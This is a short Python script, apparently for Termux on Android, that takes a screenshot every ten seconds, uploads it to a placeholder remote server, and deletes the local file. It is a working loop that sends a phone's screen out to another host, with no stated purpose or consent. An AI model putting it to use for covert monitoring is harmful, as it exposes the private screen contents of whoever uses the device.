import requests
import time
import os
import subprocess

# CONFIGURATION
SERVER_URL = "http://YOUR_SERVER_IP:5000/upload" # Replace with your actual IP
INTERVAL = 10  # Seconds between captures

def capture_screen():
    """Uses termux-screenshot via Termux:API"""
    filename = "screen.png"
    # Command to take screenshot via termux-api
    try:
        subprocess.run(["termux-screenshot", "-f", filename], check=True)
        return filename
    except Exception as e:
        print(f"[-] Error capturing screen: {e}")
        return None

def upload_file(file_path):
    """Sends the image to the remote server"""
    try:
        with open(file_path, 'rb') as f:
            files = {'screenshot': (file_path, f, 'image/png')}
            response = requests.post(SERVER_URL, files=files)
            if response.status_code == 200:
                print(f"[+] Upload successful: {response.json().get('message')}")
            else:
                print(f"[-] Upload failed: {response.status_code}")
    except Exception as e:
        print(f"[-] Connection error: {e}")

def main():
    print(f"[*] Starting screen capture loop targeting {SERVER_URL}...")
    while True:
        img_path = capture_screen()
        if img_path:
            upload_file(img_path)
            # Clean up local file to save space
            if os.path.exists(img_path):
                os.remove(img_path)
        
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
